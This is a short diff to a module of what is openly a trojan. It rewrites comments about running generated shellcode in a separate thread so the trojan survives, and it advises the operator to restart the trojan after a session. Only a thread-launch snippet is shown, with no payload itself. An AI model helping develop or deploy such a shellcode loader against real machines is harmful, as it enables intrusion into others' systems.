@@ -1,9 +1,11 @@
-#DO NOT USE
+# USE WITH CAUTION 
 
-#closer... have to figure out how to make this in its own thread right now it locks up the trojan 
-#then closes the trojan on sessions exit
+# generate shellcode with shellcode_generate.py - ARCH is important!!!!!
+# this is threaded so the trojan will still work, but IS crashing the trojan on shellcode/session exit!!!
 
-# DO NOT USE
+# RECOMMEND YOU START ANOTHER INSTANCE OF THE TROJAN AFTER YOU RUN THIS via your session
+
+# USE WITH CAUTION 
 
 
 
@@ -27,7 +29,7 @@ def run(**args):
     #####
     try:
         thread = threading.Thread(target=shell_exec)
-        thread.daemon = True                            # Daemonize thread
+        thread.daemon = True # Daemonize thread
         thread.start() # Start the execution
 
         
